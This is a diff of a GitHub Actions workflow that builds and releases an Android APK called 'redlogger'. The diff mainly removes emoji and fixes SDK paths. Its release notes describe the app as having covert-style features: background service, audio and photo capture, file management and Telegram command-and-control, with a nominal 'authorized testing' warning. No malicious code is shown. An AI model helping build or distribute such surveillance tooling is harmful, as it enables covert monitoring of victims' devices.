@@ -12,74 +12,74 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-    - name: 🧾 Checkout repository
+    - name: Checkout repository
       uses: actions/checkout@v4
 
-    - name: 🐍 Set up Python
+    - name: Set up Python
       uses: actions/setup-python@v4
       with:
         python-version: '3.10'
 
-    - name: ☕ Set up Java
+    - name: Set up Java
       uses: actions/setup-java@v3
       with:
         distribution: 'temurin'
         java-version: '17'
 
-    - name: 🧱 Install system dependencies
+    - name: Install system dependencies
       run: |
         sudo apt-get update
-        sudo apt-get install -y git zip unzip autoconf libtool pkg-config zlib1g-dev \
-          libncurses-dev cmake libffi-dev libssl-dev openjdk-17-jdk curl
+        sudo apt-get install -y git zip unzip autoconf libtool pkg-config zlib1g-dev libncurses-dev cmake libffi-dev libssl-dev openjdk-17-jdk curl
 
-    - name: 🐍 Install Python dependencies
+    - name: Install Python dependencies
       run: |
         python -m pip install --upgrade pip
         pip install buildozer cython
 
-    - name: 💾 Cache Buildozer global directory
+    - name: Cache Buildozer global directory
       uses: actions/cache@v3
       with:
         path: ~/.buildozer
         key: buildozer-${{ runner.os }}-${{ hashFiles('**/buildozer.spec') }}
 
-    - name: 💾 Cache Buildozer project build
+    - name: Cache Buildozer dependencies
       uses: actions/cache@v3
       with:
         path: redlogger_client/.buildozer
         key: buildozer-deps-${{ runner.os }}-${{ hashFiles('**/buildozer.spec') }}
 
-    - name: ⚙️ Manually install Android SDK cmdline-tools
+    - name: Manually install Android SDK cmdline-tools
       run: |
         mkdir -p ~/.buildozer/android/platform/android-sdk/cmdline-tools
         cd ~/.buildozer/android/platform/android-sdk/cmdline-tools
-        curl -sSL -o sdk.zip https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
-        unzip -q sdk.zip -d latest
+        curl -o sdk.zip https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
+        unzip sdk.zip
         rm sdk.zip
+        mv cmdline-tools latest
 
-    - name: ✅ Accept Android SDK licenses
+    - name: Accept Android SDK licenses
       run: |
-        yes | ~/.buildozer/android/platform/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses
+        yes | ~/.buildozer/android/platform/android-sdk/cmdline-tools/latest/cmdline-tools/bin/sdkmanager --licenses
 
-    - name: 🏗️ Build APK with Buildozer
+    - name: Build Android APK
       working-directory: redlogger_client
       env:
         ANDROID_HOME: /home/runner/.buildozer/android/platform/android-sdk
-        PATH: /home/runner/.buildozer/android/platform/android-sdk/cmdline-tools/latest/bin:$PATH
+        PATH: /home/runner/.buildozer/android/platform/android-sdk/cmdline-tools/latest/cmdline-tools/bin:$PATH
       run: |
         buildozer android debug
 
-    - name: 📂 List generated APKs
+    - name: List generated APKs
       working-directory: redlogger_client
       run: ls -la bin/
 
-    - name: ☁️ Upload APK artifact
+    - name: Upload APK artifact
       uses: actions/upload-artifact@v4
       with:
         name: redlogger-debug-apk
         path: redlogger_client/bin/*.apk
 
-    - name: 🚀 Create GitHub Release (if tagged)
+    - name: Create GitHub Release (if tagged)
       if: startsWith(github.ref, 'refs/tags/')
       uses: softprops/action-gh-release@v1
       with:
@@ -88,16 +88,16 @@ jobs:
         body: |
           ## Redlogger Android APK - v${{ github.ref_name }}
 
-          ### 🔒 Warning
+          ### ⚠️ Warning
           Use this tool only for authorized testing. Illegal usage is strictly prohibited.
 
-          ### 📦 APK Setup
+          ### Setup instructions:
           - Install APK on test device
-          - Setup Telegram bot token and chat ID
-          - (Optional) Configure No-IP
+          - Configure Telegram bot token and chat ID
+          - (Optional) Configure No-IP domain
 
-          ### ⚙️ Features
-          - Background execution
+          ### Features:
+          - Background service
           - Audio/photo capture
           - File management
           - Telegram C2 communication
